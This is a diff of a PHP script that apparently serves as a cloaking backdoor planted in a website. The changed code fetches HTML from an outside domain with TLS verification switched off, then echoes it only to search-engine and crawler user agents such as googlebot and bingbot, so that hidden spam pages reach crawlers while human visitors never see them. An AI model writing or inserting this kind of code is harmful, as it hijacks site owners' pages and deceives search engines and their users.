@@ -1,22 +1,24 @@
 <?php
-function smoky($url) {
-    if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
+function Japet($url) {
+    if (function_exists('curl_init')) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
         $response = curl_exec($ch);
         curl_close($ch);
         return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
     }
     return false;
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://faktawanita.com/dexnova/licinumpwr.html";
-$file = smoky($bot);
+$bot = "https://daftarwira77.com/licin/polnep.html";
+$file = Japet($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
     echo $file;
